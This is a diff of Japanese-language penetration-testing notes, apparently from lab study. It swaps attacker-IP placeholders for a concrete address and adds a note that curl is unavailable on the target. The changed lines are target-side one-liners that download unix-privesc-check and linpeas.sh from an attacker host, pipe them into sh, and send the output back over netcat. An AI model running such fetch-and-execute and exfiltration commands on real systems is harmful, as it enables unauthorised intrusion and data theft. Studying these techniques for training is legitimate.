@@ -12,6 +12,8 @@ stty raw -echo; fg
 
 # Auto 
 
+*curl は実行できない*
+
 ## unix-privesc-check
 
 ### 転送・実行
@@ -24,7 +26,7 @@ nc -lvnp 9002 | tee unix-privesc-check.out
 ```
 ```zsh
 # Target
-curl <AttackerIP>:8888/unix-privesc-check | sh -s standard | nc -q 0 <AttackerIP> 9002
+busybox curl 192.168.45.215:8888/unix-privesc-check | sh -s standard | nc -q 0 192.168.45.215 9002
 ```
 
 ### 実行結果抽出
@@ -44,7 +46,7 @@ nc -lvnp 9002 | tee linpeas.out
 ```
 ```zsh
 # Target
-curl <AttackerIP>:8888/linpeas.sh | sh | nc -q 0 <AttackerIP> 9002
+curl 192.168.45.215:8888/linpeas.sh | sh | nc -q 0 192.168.45.215 9002
 ```
 
 ### 実行結果抽出
